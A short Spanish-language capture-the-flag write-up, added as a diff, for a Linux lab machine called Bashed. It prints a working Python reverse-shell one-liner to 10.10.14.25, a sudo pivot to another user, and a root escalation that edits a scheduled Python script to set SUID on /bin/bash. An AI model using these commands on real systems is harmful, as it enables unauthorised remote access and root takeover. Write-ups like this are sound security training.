@@ -1,0 +1,44 @@
+maquina bashed ---------------------------- linux
+
+aprendizaje 
+
+Apache
+Penetration Tester Level 1
+Web
+Common Applications
+Reconnaissance
+Web Site Structure Discovery
+SUDO Exploitation
+Scheduled Job Abuse
+OS Command Injection
+Code Execution
+
+
+---------------------------------
+
+vemos en la pagina que fuzzeando encontramos una php shell que tiene guardada lapagina
+podemos entrar a la maquina atraves de una reverse shell en python ya que hemos probado
+una bash y una netcat y no hemos tenido resultado 
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",4646));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+ 
+cuando hemos entrado hemos entrado como www_data pero tenemos acceso a scriptmanager 
+
+solo hemos tenido que poner 
+
+sudo -u scriptmanager /bin/bash 
+
+y hemos obtenido la shell como scriptmanager, ahora nos toca escalar a root
+
+el tema es que hemos visto que tiene una carpeta en la raiz que se llama scripts y no suele estar, 
+
+tiene 2 archivos que uno de ellos (el txt) tiene permisos de root y el otro no por lo que intuimos 
+que el .py es una tarea programada y podemos modificarlo 
+
+hemos puesto 
+
+import os 
+
+os.system("chmod u+s /bin/bash")
+
+y hemos colocado la bash con permisos suid por lo tanto podemos lanzar el comando bash -p para poder acceder como root y listo.
